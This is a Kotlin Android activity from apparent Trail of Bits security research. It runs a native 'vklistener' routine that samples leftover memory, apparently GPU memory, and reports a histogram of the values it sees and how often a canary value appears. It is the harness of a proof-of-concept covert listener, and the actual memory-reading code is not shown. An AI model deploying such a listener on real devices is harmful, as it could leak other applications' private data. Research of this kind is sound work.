/*
   Copyright 2023 Trail of Bits

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
*/

package com.android.covertVKListener

import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import android.content.res.AssetManager

class CovertVKListener : AppCompatActivity() {
    val histogram = mutableMapOf<Int, Int>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main);
        val dumpMemoryButton = findViewById<Button>(R.id.dumpMemoryButton)
        val memoryDumpOutput = findViewById<TextView>(R.id.memoryDumpOutput)
        val itersEditText = findViewById<TextView>(R.id.editTextIterations)
        val canaryEditText = findViewById<TextView>(R.id.editTextCanaryValue)

        dumpMemoryButton.setOnClickListener {
            var toPrint = ""
            val assetManager = this.assets;

            val gridSize = 32;
            val size: Int = 4096 * gridSize

            val iters: Int = itersEditText.text.toString().toInt();
            val canary: Int = canaryEditText.text.toString().toInt();
            var canaryObservations = 0

            histogram.clear();
            for (z in 0..iters - 1) {
                val k = this.entry(assetManager);

                for (i in 0..size - 1) {
                    histogram[k[i]] = histogram.getOrDefault(k[i], 0) + 1
                    if (k[i] == canary) {
                        canaryObservations += 1
                    }
                }
            }

            // From ChatGPT :)
            val sortedHistogram =
                histogram.toList().sortedByDescending { (_, frequency) -> frequency }

            var count = 0;
            for ((value, frequency) in sortedHistogram) {
                if (count > 10) {
                    break;
                }
                toPrint += "($value, $frequency)\n"
                count += 1;
            }

            toPrint =
                "How many times observed canary value ($canary): $canaryObservations\n---\n" +
                        "Histogram of top 10 observed values:\n---\n" + toPrint
            memoryDumpOutput.text = toPrint
        }
    }

    external fun entry(assetManager: AssetManager): IntArray

    companion object {
        init {
            System.loadLibrary("vklistener")
        }
    }
}